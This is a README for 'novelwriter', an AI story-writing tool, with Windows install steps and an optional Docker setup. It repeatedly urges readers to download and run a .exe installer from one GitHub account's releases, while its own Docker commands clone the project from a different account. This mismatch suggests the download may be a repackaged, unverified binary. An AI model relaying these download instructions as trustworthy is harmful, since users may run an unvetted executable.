# ✍️ novelwriter - Write Stories with AI Help

[![Download novelwriter](https://img.shields.io/badge/Download-novelwriter-brightgreen)](https://github.com/dedyrio/novelwriter/releases)

## 📥 Download novelwriter

Click the button below to visit the official download page for novelwriter. From there, you can get the latest stable version for Windows.

[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)

## 🖥️ What is novelwriter?

novelwriter helps you write stories using AI. It does more than just add more text. It keeps track of your story’s characters, relationships, and world details. This way, the AI can add parts that fit well with what you wrote before. The result is stories that stay true to your style and make sense.

You can import existing stories, edit the story world, and create rules for how the story should grow. novelwriter uses a clear world model to keep everything consistent.

## 📸 Screenshots

![NovelWriter](docs/screenshot.png)

## 🔧 System Requirements

To run novelwriter on Windows, your computer should meet these basic requirements:

- Windows 10 or later (64-bit)
- 4 GB of RAM or more
- At least 500 MB of free disk space
- Internet connection to activate AI features

You do not need any special skills or software before installing novelwriter.

## 🚀 Getting Ready: How to Download and Install novelwriter on Windows

Follow these steps carefully to get novelwriter running on your PC.

### 1. Visit the Download Page

Open this link in your web browser:

https://github.com/dedyrio/novelwriter/releases

This page shows all available versions of novelwriter. Scroll to the latest stable release, usually marked with a version number like `v0.3.2` or higher.

### 2. Download the Windows Installer

Look for a file that ends with `.exe`. This is the Windows installer for novelwriter. Click on the file name to start the download.

The file name may look like `novelwriter-setup-v0.3.2.exe`.

### 3. Run the Installer

After the file finishes downloading, open your Windows file explorer and find the downloaded file (most likely in your "Downloads" folder).

Double-click the `.exe` file to start the installation process.

Follow the on-screen instructions:

- Choose where to install novelwriter (the default folder is fine for most users).
- Agree to the license terms.
- Confirm installation.

### 4. Launch novelwriter

When installation finishes, an icon should appear on your desktop or in your start menu.

Click on it to open novelwriter.

You may see a welcome screen or some initial setup instructions.

### 5. Setup AI Integration (Optional but Recommended)

novelwriter uses AI to help you write. To work, it needs access to an AI service key.

- If you have an API key from a supported AI provider (like OpenAI), enter it in the settings.
- If you do not have a key, some features may not work fully.

You can add or change this key anytime in the program’s settings menu.

## 🔑 Using novelwriter: Basic Features

### World Model

novelwriter saves important story elements as a "world model". This includes characters, their relationships, locations, and rules. This helps the AI generate story parts that fit your setting well.

### Import Your Existing Story

You can bring in your current story files, and novelwriter will analyze them. It finds characters and relationships automatically and builds the world model for you.

### Write With AI Help

Use the AI assistant to write the next part of your story.

- The AI adds text word by word.
- You can generate several versions at once and pick the best one.
- The AI respects your world model and story rules.

### Edit Your Story World

Use the visual editor to:

- Add or change characters
- Adjust relationships or story settings
- Set rules for the story (for example, no modern phrases if your story is historical).

### Export and Share

You can export your world model and story data as a package. Share it with others or import it later into novelwriter.

## ⚙️ Advanced Setup: Use Docker (Optional)

If you are comfortable with more technical steps, you can run novelwriter using Docker. This method isolates the software in a container and may be more reliable.

To do this:

1. Download and install Docker Desktop for Windows from https://www.docker.com/products/docker-desktop.

2. Open Windows PowerShell or Command Prompt.

3. Run these commands:

   ```bash
   git clone https://github.com/Hurricane0698/novelwriter.git
   cd novelwriter
   cp .env.example .env
   # Edit the .env file with your AI key
   docker compose up -d
   ```

4. Open your browser and visit http://localhost:8000 to use novelwriter.

This method is recommended for users who want more control or plan to run the software on a server.

## 💡 Tips for best results

- Write short story sections first, then use the AI to continue.
- Keep your world model updated when you add new characters or settings.
- Try generating multiple AI completions to find the best fit.
- Use the story rules feature to keep your narrative style consistent.

## 📞 Get Help

If you run into any issues:

- Check the FAQ or README files on the GitHub page.
- Look for issues or discussions from other users.
- Contact the developers via the GitHub repository’s "Issues" tab for technical questions.

## 📥 Download novelwriter again

Remember, you can always visit the download page to get the latest version.

[Download novelwriter on GitHub Releases](https://github.com/dedyrio/novelwriter/releases)